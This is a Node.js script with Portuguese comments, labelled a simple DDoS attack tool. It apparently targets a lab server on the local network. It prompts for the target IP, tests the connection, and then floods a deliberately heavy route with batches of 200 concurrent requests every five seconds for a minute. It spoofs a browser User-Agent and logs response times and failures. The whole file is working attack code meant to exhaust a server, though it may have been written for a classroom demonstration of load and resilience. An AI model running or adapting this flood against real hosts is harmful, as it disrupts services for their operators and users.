const http = require('http');
const fs = require('fs');
const readline = require('readline');
const { exec } = require('child_process');

//configuração
let TARGET_HOST = ''; //ip do servidor (requisitado no terminal)
const TARGET_PORT = 3000;
const TARGET_PATH = '/operacao-pesada'; //rota exaustiva
const NUM_REQUESTS = 200; //número de requisições concorrentes por vez
const ATTACK_DURATION = 60000; //duração do ataque em ms (1min)
const LOG_FILE = './attack_log.txt';

//interface de linha de comando
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

//função para descobrir o servidor na rede
function discoverServer(callback) {
    console.log('Buscando servidor na rede local...');

    //obter o IP local e máscara de rede
    exec('ifconfig | grep "inet " | grep -v 127.0.0.1', (error, stdout, stderr) => {
        if (error) {
            console.error(`Erro ao obter informações de rede: ${error}`);
            return callback(false);
        }

        //tentar detectar o IP do servidor na mesma rede
        console.log(`Verificando servidores ativos na porta ${TARGET_PORT}`);

        //solicitar o IP manualmente
        rl.question('Digite o IP do servidor Ubuntu (exibido na tela do servidor): ', (ip) => {
            TARGET_HOST = ip.trim();
            console.log(`Usando IP do servidor: ${TARGET_HOST}`);

            //testar conexão
            testConnection(callback);
        });
    });
}

//função pra testar conexão com o servidor
function testConnection(callback) {
    console.log(`Testando conexão com ${TARGET_HOST}:${TARGET_PORT}...`);

    const options = {
        hostname: TARGET_HOST,
        port: TARGET_PORT,
        path: '/',
        method: 'GET',
        timeout: 3000
    };

    const req = http.request(options, (res) => {
        console.log(`Conexão estabelecida! Status: ${res.statusCode}`);
        res.on('data', () => { });
        res.on('end', () => {
            callback(true);
        });
    });

    req.on('error', (error) => {
        console.error(`Erro ao conectar: ${error.message}`);
        console.error(`Verifique se o servidor está rodando e se o IP ${TARGET_HOST} está correto.`);
        console.error('Certifique-se de que ambos os computadores estão na mesma rede.');

        rl.question('Tentar novamente com outro IP? (s/n): ', (answer) => {
            if (answer.toLowerCase() === 's') {
                discoverServer(callback);
            } else {
                callback(false);
            }
        });
    });

    req.on('timeout', () => {
        req.destroy();
        console.error('Timeout ao conectar ao servidor.');
        rl.question('Tentar novamente? (s/n): ', (answer) => {
            if (answer.toLowerCase() === 's') {
                testConnection(callback);
            } else {
                callback(false);
            }
        });
    });

    req.end();
}

//função pra enviar uma única requisição
function sendRequest(id) {
    return new Promise((resolve) => {
        const startTime = Date.now();
        const localPort = 50000 + Math.floor(Math.random() * 10000);

        const options = {
            hostname: TARGET_HOST,
            port: TARGET_PORT,
            path: TARGET_PATH,
            method: 'GET',
            timeout: 30000, //aumentar timeout pra 30 segundos
            headers: {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive'
            }
        };

        const req = http.request(options, (res) => {
            let data = '';

            res.on('data', (chunk) => {
                data += chunk;
            });

            res.on('end', () => {
                const endTime = Date.now();
                const responseTime = endTime - startTime;

                const logEntry = `Requisição #${id} - Status: ${res.statusCode} - Tempo: ${responseTime}ms\n`;
                fs.appendFileSync(LOG_FILE, logEntry);

                resolve({
                    id,
                    status: res.statusCode,
                    time: responseTime
                });
            });
        });

        req.on('error', (error) => {
            const endTime = Date.now();
            const responseTime = endTime - startTime;

            const errorMessage = error.message;
            const logEntry = `Requisição #${id} - ERRO: ${errorMessage} - Tempo: ${responseTime}ms\n`;
            fs.appendFileSync(LOG_FILE, logEntry);

            resolve({
                id,
                status: 'ERROR',
                time: responseTime,
                error: errorMessage
            });
        });

        req.on('timeout', () => {
            req.destroy();
            const endTime = Date.now();
            const responseTime = endTime - startTime;

            const logEntry = `Requisição #${id} - ERRO: Timeout - Tempo: ${responseTime}ms\n`;
            fs.appendFileSync(LOG_FILE, logEntry);

            resolve({
                id,
                status: 'TIMEOUT',
                time: responseTime
            });
        });

        req.end();
    });
}

//função pra iniciar o ataque DoS
function startAttack() {
    console.log(`Iniciando ataque DDoS contra ${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}`);
    console.log(`Enviando ${NUM_REQUESTS} requisições concorrentes a cada 5 segundos`);

    //inicializando arquivo de log
    fs.writeFileSync(LOG_FILE, `--- Início do ataque DDoS: ${new Date().toISOString()} ---\n`);
    fs.appendFileSync(LOG_FILE, `Alvo: ${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}\n`);
    fs.appendFileSync(LOG_FILE, `Número de requisições: ${NUM_REQUESTS}\n\n`);

    let counter = 0;
    let successCount = 0;
    let failCount = 0;
    let totalResponseTime = 0;

    const attackInterval = setInterval(() => {
        //cria um lote de requisições concorrentes
        const requests = [];
        for (let i = 0; i < NUM_REQUESTS; i++) {
            const requestId = counter++;
            requests.push(sendRequest(requestId));
        }

        //processa resultados das requisições
        Promise.all(requests).then(results => {
            results.forEach(result => {
                if (result.status === 200) {
                    successCount++;
                } else {
                    failCount++;
                }
                totalResponseTime += result.time;
            });

            console.log(`Lote enviado: ${NUM_REQUESTS} requisições`);
            console.log(`Total: ${counter} | Sucesso: ${successCount} | Falha: ${failCount}`);
        });
    }, 5000); //envia um novo lote a cada 5 segundos

    //encerra o ataque após a duração especificada
    setTimeout(() => {
        clearInterval(attackInterval);

        const summary = `\n--- Fim do ataque DDoS: ${new Date().toISOString()} ---\n`;
        const stats = `Total de requisições: ${counter}\n` +
            `Requisições bem-sucedidas: ${successCount}\n` +
            `Requisições falhas: ${failCount}\n` +
            `Tempo médio de resposta: ${(totalResponseTime / counter).toFixed(2)}ms\n`;

        fs.appendFileSync(LOG_FILE, summary + stats);

        console.log(summary);
        console.log(stats);
        console.log(`Log de ataque salvo em: ${LOG_FILE}`);
        console.log('Ataque DDoS concluído');

        rl.close();
    }, ATTACK_DURATION);
}

// Menu principal
console.log('=== Ferramenta de Ataque DDoS Simples ===');
console.log(`Duração configurada: ${ATTACK_DURATION / 1000} segundos`);

// Iniciar descoberta do servidor
discoverServer((success) => {
    if (success) {
        rl.question(`Pressione ENTER para iniciar o ataque contra ${TARGET_HOST}:${TARGET_PORT} ou Ctrl+C para cancelar...`, () => {
            startAttack();
        });
    } else {
        console.log('Não foi possível estabelecer conexão com o servidor. Encerrando programa.');
        rl.close();
    }
});